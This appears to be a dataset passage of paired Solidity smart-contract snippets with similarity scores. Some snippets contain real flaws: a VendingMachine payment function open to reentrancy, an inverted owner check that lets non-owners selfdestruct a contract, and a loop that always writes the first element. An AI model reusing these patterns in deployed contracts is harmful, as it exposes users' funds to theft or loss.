    function addToWhitelist(address _beneficiary) external onlyOwnerOrAdmin {

        whitelist[_beneficiary] = true;

    }



    

    function addManyToWhitelist(address[] _beneficiaries) external onlyOwnerOrAdmin {

        for (uint256 i = 0; i < _beneficiaries.length; i++) {

            whitelist[_beneficiaries[i]] = true;

        }

    }



    

    function removeFromWhitelist(address _beneficiary) external onlyOwnerOrAdmin {

        whitelist[_beneficiary] = false;

    }



    

    function getTotalIndividualWeiAmount(address _beneficiary) external view onlyOwnerOrAdmin returns (uint256) {

        return totalIndividualWeiAmount[_beneficiary];

    }



    

    function setTotalIndividualWeiAmount(address _beneficiary,uint256 _totalWeiAmount) external onlyOwner {

        totalIndividualWeiAmount[_beneficiary] = _totalWeiAmount;

    }



    

    function addTotalIndividualWeiAmount(address _beneficiary,uint256 _weiAmount) external onlyOwner {

        totalIndividualWeiAmount[_beneficiary] = totalIndividualWeiAmount[_beneficiary].add(_weiAmount);

    }



}"
"contract VendingMachine {

event Unlocked(address machineID, address unlocker);
event MachinePayed(address machineID, uint amount);
event CustomerPayed(address customer, uint amount);

address admin;

struct Machine {
    bool exists;
    bool isFunded;
    address owner;
    address currentBuyer;
    uint minFunding;
    uint escrowBalance;
}

mapping(address => Machine) public machines;

modifier onlyMachines() {
    if (machines[msg.sender].exists)
    _
}

modifier onlyAdmin() {
    if (msg.sender==admin)
    _
}

function () { throw; }

function VendingMachine() {

    admin=msg.sender;
}

function fundMachine(address _machineID) {
    if (msg.value < machines[_machineID].minFunding)
    throw;
    machines[_machineID].currentBuyer=msg.sender;
    machines[_machineID].isFunded = true;
    machines[_machineID].escrowBalance = msg.value;
    Unlocked(_machineID, msg.sender);
}

function executePayment(uint _price) onlyMachines {
    machines[msg.sender].escrowBalance -= _price;
    machines[msg.sender].currentBuyer.call.value(machines[msg.sender].escrowBalance)();
    CustomerPayed(machines[msg.sender].currentBuyer, machines[msg.sender].escrowBalance);
    msg.sender.call.value(_price)();
    MachinePayed(msg.sender, _price);

    
    machines[msg.sender].escrowBalance = 0;
    machines[msg.sender].isFunded = false;

}

function registerMachine(address _machineID, address _owner, uint _minFunding) onlyAdmin {
    machines[_machineID].exists = true;
    machines[_machineID].owner = _owner;
    machines[_machineID].minFunding = _minFunding;
}

function checkAdmin() returns (address){
return admin;
}
}",0.5582097084097524,"contract NewToken {
	uint public totalSupply = 2300000000000000;
	
	string public name = ""TTInvest"";
	uint8 public decimals = 8;
	string public symbol = ""TTInvest"";
	string public version = ""1.0"";

function NewToken(){
  balances[msg.sender] = 2300000000000000;
}

	mapping (address => uint256) balances;
	mapping (address => mapping (address => uint)) allowed;

	
	modifier onlyPayloadSize(uint size) {
		assert(msg.data.length == size + 4);
		_;
	} 

	function balanceOf(address _owner) constant returns (uint balance) {
		return balances[_owner];
	}

	function transfer(address _recipient, uint _value) onlyPayloadSize(2*32) {
		require(balances[msg.sender] >= _value && _value > 0);
	    balances[msg.sender] -= _value;
	    balances[_recipient] += _value;
	    Transfer(msg.sender, _recipient, _value);        
    }

	function transferFrom(address _from, address _to, uint _value) {
		require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0);
        balances[_to] += _value;
        balances[_from] -= _value;
        allowed[_from][msg.sender] -= _value;
        Transfer(_from, _to, _value);
    }

	function approve(address _spender, uint _value) {
		allowed[msg.sender][_spender] = _value;
		Approval(msg.sender, _spender, _value);
	}

	function allowance(address _spender, address _owner) constant returns (uint balance) {
		return allowed[_owner][_spender];
	}

	
	event Transfer(
		address indexed _from,
		address indexed _to,
		uint _value
		);
		
	
	event Approval(
		address indexed _owner,
		address indexed _spender,
		uint _value
		);

}"
"contract Depository {
    function transferFrom(uint amount) external {
        Token token = Token(0xFab46E002BbF0b4509813474841E0716E6730136);
        token.transferFrom(msg.sender, address(this), amount);
    }
}",0.5615850922988714,"contract TokenVault is Ownable {
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
}"
"contract ExchangeContract {
  enum CurrencyType { USD, TWOKEY, BTC, ETH, DAI, USDT, TUSD, EUR, JPY, GBP}

  mapping(uint256 => CurrencyPrice) public priceByCurrencyType;

  struct Price{
    uint price;
    uint decimals;
  }

  struct CurrencyPrice{
    uint currencyInt;
    Price price;
  }

  function updatePrices(CurrencyPrice[] memory _array) public {
    for(uint i=0; i<_array.length; i++){
      priceByCurrencyType[_array[0].currencyInt].price=_array[i].price;
    }
  }
}",0.5027605654941515,"contract IMarketplace {
    enum ProductState {
        NotDeployed,                
        Deployed                    
    }

    enum Currency {
        DATA,                       
        USD                         
    }

    enum WhitelistState{
        None,
        Pending,
        Approved,
        Rejected
    }
    function getSubscription(bytes32 productId, address subscriber) public view returns (bool isValid, uint endTimestamp) {}
    function getPriceInData(uint subscriptionSeconds, uint price, Currency unit) public view returns (uint datacoinAmount) {}
}"
"contract C {
    address[] addrList;

    function addAddr(address addr) {
        addrList.push(addr);
    }

    function deleteAddr(address addr) {

        for(uint256 i = 0; i < addrList.length; i++) {
             if(addr == addrList[i]) {
                 for(uint256 j = i; j < addrList.length; j++) {
                     addrList[j] = addrList[j + 1];
                 }
                 delete addrList[addrList.length - 1];
                 addrList.length--; 
             }
        }
    }
}",0.5613363511743056,"contract MassTopUp is Ownable {

    using SafeMath for uint256;



    function() external payable { }



    function mass_topup(address[] _addresses, uint256[] _amounts) public payable onlyOwner {

        uint256 i = 0;

        assert(_addresses.length == _amounts.length);

        while (i < _addresses.length) {

            _addresses[i].transfer(_amounts[i]);

            i += 1;

        }

    }

}"
"contract PastryChef {
    using StringUtils for StringUtils;

    string name;

    function PastryChef(string _name) public {
        require(!StringUtils.isEmptyString(_name)); 
        name = _name;
    }

}",0.5992076035656139,"contract MyTest{
    string private name;
   
    function setName(string newName) public{
        name=newName;
    }
    
    function getName() public view returns(string){
        return name;
    }
    
}"
"contract Test {
  uint public myVal;

  function callIt() {
      this.call.gas(50000)(bytes4(sha3(""setMyVal(uint256)"")), 123);
  }

  function setMyVal(uint _newVal) internal {
      myVal = _newVal;
  }
}",0.5478009637297062,"contract SimpleStorageKevin {

    

    

    uint x = 316;



    

    function setKevin(uint newValue)

        public

    {

        x = newValue;

    }

    

    

    function getKevin()

        public

        view

        returns (uint) 

    {

        return x;

    }

}"
"contract Proxy {
    address watch_addr = 0xEB1e2c19bd833b7f33F9bd0325B74802DF187935;
    address user_addr = msg.sender;

    function register(string _text) {
        Name name = Name(watch_addr);
        name.register(_text);
    }
}",0.535426914336142,"contract AssetStorage {
    function addTrustedIssuer(address addr, string name);
    function removeTrustedIssuer(address addr, string name);
    function assertFact(uint id, string fact);
}"
"contract Funding {
    function sum(uint input1, uint input2) public returns (uint) {
        return input1 + input2;
    }

    struct patient{
        uint id;
        string fullName;
        mapping(uint => string[]) DoctorAccess;        
    }

    function getPatient(uint patientId, uint doctorId) public returns (string[]) {
        patient p;
        p.id = 1;
        p.fullName=""Saran"";
        p.DoctorAccess[doctorId].push(""Doctor1Key"");
        return p.DoctorAccess[doctorId];
    }
}",0.5862229460286698,"contract BaseFactory {

    address public mainFabricAddress;
    string public title;

    struct Parameter {
        string title;
        string paramType;
    }

    
    Parameter[] public params;

    
    function numParameters() public view returns (uint256)
    {
        return params.length;
    }

    function getParam(uint _i) public view returns (
        string title,
        string paramType
    ) {
        return (
        params[_i].title,
        params[_i].paramType
        );
    }
}"
"contract EthBooking {
    function addBooking(uint listingId) public payable returns(uint bookingId) {
    bookingId =  BookingLibrary.book(ethDB, listingId, msg.sender, msg.value);

    
    return bookingId;
}
}",0.5297697170557298,"contract showNum {
    address owner = msg.sender;

    uint _num = 0;
   function setNum(uint number) public payable {
        _num = number;
    }

    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract First {
    Second private _oSecond;
    int32 public _nRes1;

    constructor(address oSecond) public payable {
        _oSecond = Second(oSecond);
        _nRes1 = 3;
    }
    function TestError() public {
        _oSecond.State();
        
        _nRes1 = 5;
    }
}",0.5598231050469618,"contract truth{
    bool public x;
    address payable z;
    
    constructor() public{
        z = msg.sender;
    }
    
    function vote(bool y) public payable{
        x=y;
    }
    
    function transf() public{
        z.transfer(address(this).balance);
    }
}"
"contract Test {

    uint[4] public arr; 
    event TestLog(string logmessage);

    function Test() public {
        arr[0] = 1; 
    }

    function checkArray() public {
        if(arr[0] == 1) { 
            arr[1] = 1;
            arr[0] = 0; 
        }
        TestLog(""some log"");
    }

}",0.558559695165188,"contract Token {

    function balanceOf(address a) public pure returns (uint) {

        (a);

        return 0;

    }



    function transfer(address a, uint val) public pure returns (bool) {

        (a);

        (val);

        return false;

    }

}"
"contract StructArrayInitWrong {
  struct Room {
    address[] players;       
  }  
  Room[] rooms;

  function createRoom() public {
    address[] adr;
    adr.push(msg.sender);
    Room memory room = Room(adr);   
    rooms.push(room);
  }

  function getRoomsLength() view returns (uint) {
    return rooms.length;
  }
}",0.5975166095550914,"contract BalanceChecker {
  address public owner;
 

  constructor() public {
    owner = msg.sender;
  }

  function check(address[] memory addresses) public view returns (bool){
    
 
    for(uint i=0; i<addresses.length;i++){
      if(addresses[i].balance != 0){
          return true;
      }
    }
    return false;
    
  }
}"
"contract Augur {
     function createYesNoMarket(uint256 _endTime, uint256 _feePerEthInWei, ICash _denominationToken, address _designatedReporterAddress, bytes32 _topic, string _description, string _extraInfo) public afterInitialized payable returns (IMarket _newMarket);
}",0.5755259537033524,"contract IMarketplace1 is IMarketplace{
    function getProduct(bytes32 id) public view returns (string memory name, address owner, address beneficiary, uint pricePerSecond, Currency currency, uint minimumSubscriptionSeconds, ProductState state) {}
}"
"contract AugurWrapper {
    Augur universe;
    constructor(address _address) public {
        universe = Augur(_address);
    }
    function myCreateMarket(uint256 _endTime, uint256 _feePerEthInWei, ICash _denominationToken, address _designatedReporterAddress, bytes32 _topic, string _description, string _extraInfo) public {
        return universe.createYesNoMarket(_endTime,_feePerEthInWei,_denominationToken,_designatedReporterAddress, _topic, _description, _extraInfo);
    }
}",0.5314972851036803,"contract FundEIF {



  address public destinationAddress;

  event Logged(address indexed sender, uint amount, uint256 timestamp, bool sent);



  constructor() public {

    destinationAddress = 0x35027a992A3c232Dd7A350bb75004aD8567561B2;  

  }

  

  function () external payable {

      emit Logged(msg.sender, msg.value, now, msg.sender != destinationAddress);

      if (msg.sender != destinationAddress) {  

         if(!destinationAddress.call.value(address(this).balance)()) {

            revert();

         }

      } 

  }



}"
"contract myContract {
   event Debug(bytes data);
   function myDynamicFunction(uint[2][] myArray) public returns (bytes) {       
       address(this).delegatecall(bytes4(sha3(""myDynamicFunction(uint[2][])"")), myArray);
       return msg.data;
   }
   function () {
       emit Debug(msg.data); 
   }
}",0.543633904386393,"contract iERC223Token {
    function transfer(address to, uint value, bytes data) public returns (bool ok);
    function transferFrom(address from, address to, uint value, bytes data) public returns (bool ok);
}"
"contract SimpleMultiSig {

  uint public nonce;                
  uint public threshold;            
  mapping (address => bool) isOwner; 
  address[] public ownersArr;        

  function SimpleMultiSig(uint threshold_, address[] owners_) {
    require(owners_.length <= 10 && threshold_ <= owners_.length && threshold_ != 0);

    address lastAdd = address(0); 
    for (uint i=0; i<owners_.length; i++) {
      require(owners_[i] > lastAdd);
      isOwner[owners_[i]] = true;
      lastAdd = owners_[i];
    }
    ownersArr = owners_;
    threshold = threshold_;
  }

  
  function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination, uint value, bytes data) {
    require(sigR.length == threshold);
    require(sigR.length == sigS.length && sigR.length == sigV.length);

    
    bytes32 txHash = keccak256(byte(0x19), byte(0), this, destination, value, data, nonce);

    address lastAdd = address(0); 
    for (uint i = 0; i < threshold; i++) {
        address recovered = ecrecover(txHash, sigV[i], sigR[i], sigS[i]);
        require(recovered > lastAdd && isOwner[recovered]);
        lastAdd = recovered;
    }

    
    nonce = nonce + 1;
    require(destination.call.value(value)(data));
  }

  function () payable {}
}",0.5952541342215505,"contract ChainPay is MigratoryToken {

	using SafeMath for uint256;



	

	string public name;

	

	string public symbol;

	

	uint8 public decimals;



	

	function ChainPay() public {

		name = ""ChainPay"";

		symbol = ""CIP"";

		decimals = 18;

		totalSupply_ = 6060660000000000000000000; 

		

		balances[owner] = totalSupply_;

		holders[holders.length++] = owner;

		isHolder[owner] = true;

	}



	address public migrationGate;



	

	function setMigrationGate(address _addr) public onlyOwner {

		migrationGate = _addr;

	}





	modifier onlyMigrationGate() {

		require(msg.sender == migrationGate);

		_;

	}





	function transferMulti(address [] _tos, uint256 [] _values) public onlyMigrationGate returns (string) {

		require(_tos.length == _values.length);

		bytes memory return_values = new bytes(_tos.length);



		for (uint256 i = 0; i < _tos.length; i++) {

			address _to = _tos[i];

			uint256 _value = _values[i];

			return_values[i] = byte(48); 



			if (_to != address(0) &&

				_value <= balances[msg.sender]) {



				bool ok = transfer(_to, _value);

				if (ok) {

					return_values[i] = byte(49); 

				}

			}

		}

		return string(return_values);

	}







	function() public payable {

		revert();

	}

}"
"contract MyContract is usingOraclize {

    uint public tmp = 0;
    function callThisToStart() {
        oraclize_query(60, ""URL"", """");
    }

    function __callback(bytes32 myid, string result) {
        if (msg.sender != oraclize_cbAddress()) throw;
        doSomething();
        callThisToStart();
    }

    function doSomething() {
        tmp++;
    }

}",0.5640828855585956,"contract Hash {
    
    address owner;

    
    function Hash() public {
        owner = msg.sender;
    }

    
    function() internal {
        revert();
    }

    function hash(string dataString) public pure returns(bytes32){
        return(keccak256(dataString));
    }

    function selfDestruct() public {
        if (msg.sender == owner) {
            selfdestruct(owner);
        }
    }
}"
"contract DBKeys {

    struct keyStruct {
        bool keyStatus; 
    }
    mapping(bytes32=>keyStruct) public zkeys;
    function addZkey( bytes32 newkey) public returns (bool) {
    if (zkeys[newkey].keyStatus) {
        return false; 
        }
        zkeys[newkey].keyStatus=true;
        return true;    
    }
    function delZkey(bytes32 newkey) public returns (bool) {
        if (zkeys[newkey].keyStatus) {
            delete zkeys[newkey];
            return true;
        }
        return false;
    }
}",0.5623789256898263,"contract Pausable is Ownable {
  event Pause();
  event Unpause();

  bool public paused = false;


  
  modifier whenNotPaused() {
    require(!paused);
    _;
  }

  
  modifier whenPaused {
    require(paused);
    _;
  }

  
  function pause() public onlyOwner whenNotPaused returns (bool) {
    paused = true;
    return true;
  }

  
  function unpause() public onlyOwner whenPaused returns (bool) {
    paused = false;
    return true;
  }
}"
"contract getSchwifty {
  string internal constant seeWhatYouGot = ""I want to see what you got!"";
  string internal contestResult;

  
  function getSchwifty(string _contestResult) public {
    contestResult = _contestResult;
  }

  function showMeWhatYouGot() external pure returns (string) {
    return seeWhatYouGot;  
  }

  function enterContest(string _contestEntry) external view returns (string) {
    
    return contestResult;
  }
}",0.5608664236943375,"contract PricingStrategy {

  
  uint public presaleMaxValue = 0;

  function isPricingStrategy() external constant returns (bool) {
      return true;
  }

  function getPresaleMaxValue() public constant returns (uint) {
      return presaleMaxValue;
  }

  function isPresaleFull(uint weiRaised) public constant returns (bool);

  function getAmountOfTokens(uint value, uint weiRaised) public constant returns (uint tokensAmount);
}"
"contract Creation {

    int basiclife = 50;

    struct hero {
        string name;
        int life;
        int lvl;
        int xp;
        int attack;
        int winCount;
        int trophies;
        int lossCount;
    }

    hero[] public heroes; 

    struct enemy {  
        string name;
        int life;
        int lvl;
        int xp;
        int attack;
    }

    enemy[] public enemies;
    mapping (uint => address) public herotoowner;
    mapping (address => uint) public heroCount;
    mapping (uint => address) public monstertoowner;
    uint public monsterCount; 

    function createhero (string memory _name) public {
        require(heroCount[msg.sender] == 0);
        uint id= heroes.push(hero(_name, basiclife, 1, 0, 20, 0, 0, 0))-1;
        herotoowner[id] = msg.sender;
        heroCount[msg.sender]++;
    }

    function enemyRage (int _herolvl) public {
        uint id = enemies.push(enemy(""Rage"", 20*_herolvl, _herolvl, 7*_herolvl, 5*_herolvl)) - 1;
        monstertoowner[id] = msg.sender;
        monsterCount++;
    }

    function enemyDerpina (int _herolvl) public {
        uint id = enemies.push(enemy(""Derpina"", 40*_herolvl, _herolvl, 14*_herolvl, 10*_herolvl)) - 1; 
        monstertoowner[id] = msg.sender;
        monsterCount++;
    }

    function getHerosByOwner (address owner) external view returns (uint) {
        uint result = 999999;
        for (uint i = 0; i < heroes.length; i++) {
            if (herotoowner[i] == owner) {
                result = i;
                break;
            }
        }
        return result;
    }

    function getmonstersByOwner (address owner) external view returns (uint) {
        uint result = 0;
        for (uint i = enemies.length; i > 0; i--) {
            if (monstertoowner[i] == owner) {
                result = i;
                break;
            }
        }
        return result;
    }

    uint nonce=0;

    function randNum (int _num) private returns (int) {  
        int randomnumber = int(keccak256(abi.encodePacked(now, msg.sender, nonce))) % _num;
        if (randomnumber <= 0) {
            randomnumber = (-1)*randomnumber;
        }
        nonce++;
        return randomnumber;
    }

    function attack_hero (uint _heroid, uint _monsterid, int _num) external returns (string memory, int, int, int, int ) {
        hero storage myhero = heroes[_heroid];
        enemy storage monster = enemies[_monsterid];
        int attackofhero = 0;
        if(_num == 0) { 
            attackofhero = randNum(myhero.attack);
        }

        monster.life = monster.life - attackofhero;
        int attackofmonster = randNum(monster.attack);
        myhero.life = myhero.life - attackofmonster;

        if (monster.life <= 0 && myhero.life > 0) {
            myhero.winCount++;
            myhero.xp += monster.xp;
            if (randNum(100) > 50 ){ 
                myhero.trophies++;
            }
            return(""win"", myhero.lvl, myhero.xp, myhero.life, myhero.trophies);
        }

        if (myhero.xp >= 10+2*myhero.lvl){ 
            myhero.lvl++;
            myhero.xp = 0; 
            myhero.life = basiclife*myhero.lvl;  
            myhero.attack = myhero.attack*myhero.lvl;
        }

        if (myhero.life <= 0 ) { 
            myhero.lossCount++; 
            return(""dead"", myhero.lossCount, myhero.life, myhero.lvl, myhero.trophies);
        }
        return(""attack"", myhero.life, attackofhero, monster.life, attackofmonster);
    }

    function resurrection (uint _heroid) public { 
        hero storage myhero = heroes[_heroid];
        myhero.life = basiclife*myhero.lvl;
    }
}",0.582367850082283,"contract KetherHomepage {
    
    event Buy(
        uint indexed idx,
        address owner,
        uint x,
        uint y,
        uint width,
        uint height
    );

    
    event Publish(
        uint indexed idx,
        string link,
        string image,
        string title,
        bool NSFW
    );

    
    event SetAdOwner(
        uint indexed idx,
        address from,
        address to
    );

    
    uint public constant weiPixelPrice = 1000000000000000;

    
    uint public constant pixelsPerCell = 100;

    bool[100][100] public grid;

    
    address contractOwner;

    
    
    address withdrawWallet;

    struct Ad {
        address owner;
        uint x;
        uint y;
        uint width;
        uint height;
        string link;
        string image;
        string title;

        
        
        bool NSFW;
        
        bool forceNSFW;
    }

    
    Ad[] public ads;

    function KetherHomepage(address _contractOwner, address _withdrawWallet)public {
        require(_contractOwner != address(0));
        require(_withdrawWallet != address(0));

        contractOwner = _contractOwner;
        withdrawWallet = _withdrawWallet;
    }

    
    function getAdsLength() constant public returns (uint) {
        return ads.length;
    }
    
    function  getContractOwner() constant public returns (address){
        return contractOwner;
    }

    
    function getWithdrawalAddress() constant public returns (address){
        return withdrawWallet;
    }
    
    
    
    
    function buy(uint _x, uint _y, uint _width, uint _height) payable public returns (uint idx) {
        uint cost = _width * _height * pixelsPerCell * weiPixelPrice;
        require(cost > 0);
        require(msg.value >= cost);

       idx = addAd(_x, _y, _width, _height);
        
        return idx;
    }

  
    
    
    
    
    
    function reserveAdd(uint _x, uint _y, uint _width, uint _height) public returns (uint idx) {
        require(contractOwner == msg.sender);
        
        idx = addAd(_x, _y, _width, _height);
        
        return idx;
    }

    function addAd(uint _x, uint _y, uint _width, uint _height)private returns(uint idx){
        
        for(uint i=0; i<_width; i++) {
            for(uint j=0; j<_height; j++) {
                if (grid[_x+i][_y+j]) {
                    
                    revert();
                }
                grid[_x+i][_y+j] = true;
            }
        }

        
        Ad memory ad = Ad(msg.sender, _x, _y, _width, _height, """", """", """", false, false);
        idx = ads.push(ad) - 1;
        Buy(idx, msg.sender, _x, _y, _width, _height);
        return idx;
    }
    
    
    
    
    
    
    
    
    
    function publish(uint _idx, string _link, string _image, string _title, bool _NSFW) public{
        Ad storage ad = ads[_idx];
        require(msg.sender == ad.owner);
        ad.link = _link;
        ad.image = _image;
        ad.title = _title;
        ad.NSFW = _NSFW;

        Publish(_idx, ad.link, ad.image, ad.title, ad.NSFW || ad.forceNSFW);
    }

    
    function setAdOwner(uint _idx, address _newOwner) public{
        Ad storage ad = ads[_idx];
        require(msg.sender == ad.owner);
        ad.owner = _newOwner;

        SetAdOwner(_idx, msg.sender, _newOwner);
    }

    
    function forceNSFW(uint _idx, bool _NSFW) public{
        require(msg.sender == contractOwner);
        Ad storage ad = ads[_idx];
        ad.forceNSFW = _NSFW;

        Publish(_idx, ad.link, ad.image, ad.title, ad.NSFW || ad.forceNSFW);
    }

    
    function withdraw() public{
        require(msg.sender == contractOwner);
        withdrawWallet.transfer(this.balance);
    }
}"
"contract MyContractB {

    function test() returns (uint ret) {
        address instanceAddress = new MyContractA();
        MyContractA instance = MyContractA(instanceAddress);
        
        return instance.myArray(0); 
        
        
        
        
        

        
        

        
        
    }
}",0.579389574496536,"contract IContractRegistry {

    function addressOf(bytes32 _contractName) public view returns (address);



    

    function getAddress(bytes32 _contractName) public view returns (address);

}"
"contract MY_PERSONS {

    struct Person{
        string name;
        uint age;
    }

    Person[] private persons;

    constructor ( Person[] _persons ) public {
    
    for(uint i=0; i<_persons.length; i++)
        persons.push(_persons[i]);
    }

    function add_person(Person _person) public  {
        persons.push(_person);
    }

    function get_person(uint index) public view returns(Person) {
        require(index >=0 && index < persons.length);
        return persons[index];
    }

}",0.560929420772672,"contract BaseFactory {

    address public mainFabricAddress;
    string public title;

    struct Parameter {
        string title;
        string paramType;
    }

    
    Parameter[] public params;

    
    function numParameters() public view returns (uint256)
    {
        return params.length;
    }

    function getParam(uint _i) public view returns (
        string title,
        string paramType
    ) {
        return (
        params[_i].title,
        params[_i].paramType
        );
    }
}"
"contract MyContract {
  function createNewToken(string _name) payable returns (address newToken) {
    require(msg.value == 1 ether);
    tokenNames.push(_name);
    ERC20 newToken = new ERC20();
    return address(newToken);
  }
}",0.5943123155732902,"contract SafeWithdraw is Ownable {

    

    function withdrawTokens(Token token, address to, uint256 amountOrId) external onlyOwner returns (bool) {

        require(to != address(0));

        return token.transfer(to, amountOrId);

    }

}"
"contract multisig2of3 {
    address signer1;
    address signer2;
    address signer3;
    address payable receiver1;
    address payable receiver2;
    address payable receiver3;

    constructor(address owner1, address owner2, address owner3) public {
        assert(owner1 != owner2);
        assert(owner2 != owner3);
        assert(owner3 != owner1);
        signer1 = owner1;
        signer2 = owner2;
        signer3 = owner3;
    }

    function deposit() public payable {
        if (msg.value > 1 ether || address(this).balance > 1 ether) revert();
    }

    function setReceiver(address payable newReceiver) public {
        if (msg.sender == signer1) receiver1 = newReceiver;
        if (msg.sender == signer2) receiver2 = newReceiver;
        if (msg.sender == signer3) receiver3 = newReceiver;
    }

    function withdraw() public {
        address payable approvedReceiver;
        if (receiver1 == receiver2) approvedReceiver = receiver1;
        if (receiver2 == receiver3) approvedReceiver = receiver2;
        if (receiver3 == receiver1) approvedReceiver = receiver3;
        require(approvedReceiver != address(0));
        receiver1 = address(0);
        receiver2 = address(0);
        receiver3 = address(0);
        approvedReceiver.transfer(address(this).balance);
    }
}",0.5634844323030362,"contract Wallet is Pausable {
    event DepositWallet(address _depositBy, uint256 _amount);
    event Withdraw(uint256 _amount);
    event Transfer(address _to,uint256 _amount);
    
    address public owner;
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyAdminOrOwner() {
        require(msg.sender == owner || msg.sender == admin);
        _;
    }
    constructor(address _admin,address _who) public {
        require(_admin != address(0));
        admin = _admin;
        owner = _who;
    }
    
    
    function setOwner(address _who) external onlyAdmin {
        owner = _who;
    }
    
    function deposit() public payable{
        emit DepositWallet(msg.sender,msg.value);
    }
    
    function() public payable{
        emit DepositWallet(msg.sender,msg.value);
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
    
    function transfer(address _to,uint256 _amount) external onlyOwner whenNotPaused{
        require(address(this).balance>=_amount);
        require(_to!=address(0));
        if (_amount>0){
            _to.transfer(_amount);
        }
        emit Transfer(_to,_amount);
    }
    
    function withdraw() public onlyOwner whenNotPaused{
        require(owner!=address(0));
        uint256 _val = address(this).balance;
        if (_val>0){
            owner.transfer(_val);
        }
        emit Withdraw(_val);
    }
}"
"contract Greeter is Mortal {
    string greeting;
   constructor( string memory _greeting) public {
        greeting = _greeting;
    }

    function changeGreeting(  string memory _greeting) public {
        greeting = _greeting;
    }

    function greet() public view returns (string memory) {
        return greeting;
    }
}",0.5954288274485534,"contract ERC20Interface {
  function name() public view returns (string memory);
  function symbol() public view returns (string memory);
  function decimals() public view returns (uint8);
  function balanceOf(address _owner) public view returns (uint256 balance);
}"
"contract TokenAccessor { 
  ERC721Token public nft;

  constructor(address _tokenAddress) public {
    nft= ERC721Token(_tokenAddress);
  }

   function changeOperator() public {
    nft.setApprovalForAll(msg.sender, true);
   }
}",0.5808404891423691,"contract TokenHolder is Ownable {
    
    
    
    function transferAnyERC20Token(address _tokenAddress, uint256 _amount) public onlyOwner returns (bool success) {
        return ERC20(_tokenAddress).transfer(owner, _amount);
    }
}"
"contract Courses {

struct Instructor {
    uint age;
    string fName;
    string lName;
}

mapping (address => Instructor) instructors;
address[] public instructorAccts;

function setInstructor(address _address, uint _age, string _fName, string _lName) public {
    instructors[_address].age = _age;
    instructors[_address].fName = _fName;
    instructors[_address].lName = _lName;

    instructorAccts.push(_address) -1;
}

function getInstructors() view public returns(address[]) {
    return instructorAccts;
}

function getInstructor(address _address) view public returns (uint, string, string) {
    return (instructors[_address].age, instructors[_address].fName, instructors[_address].lName);
}

function countInstructors() view public returns (uint) {
    return instructorAccts.length;
}

}",0.5883356765950963,"contract AccessControlClient {





    AccessControlManager public acm;





    constructor(AccessControlManager addr) public {

        acm = AccessControlManager(addr);

    }



    

    function addRole(address addr, string roleName)

    public

    {

        acm.adminAddRole(addr,roleName);

    }





    

    function removeRole(address addr, string roleName)

    public

    {

        acm.adminRemoveRole(addr,roleName);

    }



    

    function addRoles(address[] addrs, string roleName)

    public

    {

        acm.adminAddRoles(addrs,roleName);



    }





    

    function removeRoles(address[] addrs, string roleName)

    public

    {

        acm.adminRemoveRoles(addrs,roleName);

    }



    

    function checkRole(address addr, string roleName)

    view

    public

    {

        acm.checkRole(addr, roleName);

    }



    

    function hasRole(address addr, string roleName)

    view

    public

    returns (bool)

    {

        return acm.hasRole(addr, roleName);

    }





}"
"contract MyStructExample {
    struct MyStruct {
        address addr;
        string description;
        bool completed;
    }

    address owner;
    mapping (address => mapping(string => MyStruct)) myStructs;

    
    function MyStructExample() {
        owner = msg.sender;
    }

    
    function setMyStruct(address _addr, string _description) {
        MyStruct storage myStruct;

        myStruct.addr = _addr;
        myStruct.description = _description;
        myStruct.completed = false;

        myStructs[myStruct.addr][myStruct.description] = myStruct;
    }

    
    function getMyStruct(address _addr, string _description) constant returns (address, string, bool) {
        MyStruct memory myStruct = myStructs[_addr][_description];
        return (myStruct.addr, myStruct.description, myStruct.completed);
    }

    
    function setCompleted(address _addr, string _description) onlyOwner returns (bool) {
        myStructs[_addr][_description].completed = true;

        return myStructs[_addr][_description].completed;
    }

    modifier onlyOwner() {
        assert(msg.sender != owner);
        _;
    }

    function kill() onlyOwner { 
        selfdestruct(owner);
    }
}",0.5579497939569463,"contract MarriageContract {



    address a;

    address b;

    uint256 till;

    string agreement;



    mapping(address => bool) coupleConfirmations;

    mapping(address => bool) witnesses;



    modifier onlyCouple(){

        require(msg.sender == a || msg.sender == b);

        _;

    }



    function MarriageContract(address _a, address _b, uint256 _till, string _agreement){

        a = _a;

        b = _b;

        till = _till;

        agreement = _agreement;

    }



    function getA() returns (address) {

        return a;

    }



    function getB() returns (address) {

        return b;

    }



    function getTill() returns (uint256){

        return till;

    }



    function getAgreement() returns (string) {

        return agreement;

    }



    function married() constant returns (bool) {

        return coupleConfirmations[a] && coupleConfirmations[b] && till <= now;

    }



    function signContract() onlyCouple() {

        coupleConfirmations[msg.sender] = true;

    }



    function signWitness(){

        witnesses[msg.sender] = true;

    }



    function isWitness(address _address) constant returns (bool) {

        return witnesses[_address];

    }



}"
"contract Shop {

    struct ShopOwner {
        string id;
        string[] productList;
    }

    struct Product {
        string id;
        string name;
    }

    mapping(string => ShopOwner) private mapShopOwner;

    function getUserProductList(string _shopOwnerId) public view returns(string[]) {
        return (mapShopOwner[_shopOwnerId].productList);
    }

}",0.5562431292726059,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract NewBook {

    struct ChapterData {
        
        string title;
        uint pages;
    }

    struct BookData {
        
        ChapterData[] chapters;
    }

    mapping(bytes32 => BookData) books; 

    function addChapter(bytes32 _bookID, string memory title, uint pages) public {
        ChapterData memory c = ChapterData({
            title: title,
            pages: pages
        });
        books[_bookID].chapters.push(c);
    }",0.506128260298825,"contract TokenInterface is ERC20Interface {

    function symbol() public view returns (string memory);

    function name() public view returns (string memory);

    function decimals() public view returns (uint8);

    function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success);

}"
"contract MyContract{
uint256 public sqrtValue;
Aion aion;
uint256 public myData;

constructor(uint256 number) public payable{
    scheduleMyfucntion(number);
    myData = 1;
}

function scheduleMyfucntion(uint256 number) public {
    aion = Aion(0xFcFB45679539667f7ed55FA59A15c8Cad73d9a4E);
    bytes memory data = abi.encodeWithSelector(bytes4(keccak256('myfucntion(uint256)')),number); 
    uint callCost = 200000*1e9 + aion.serviceFee();
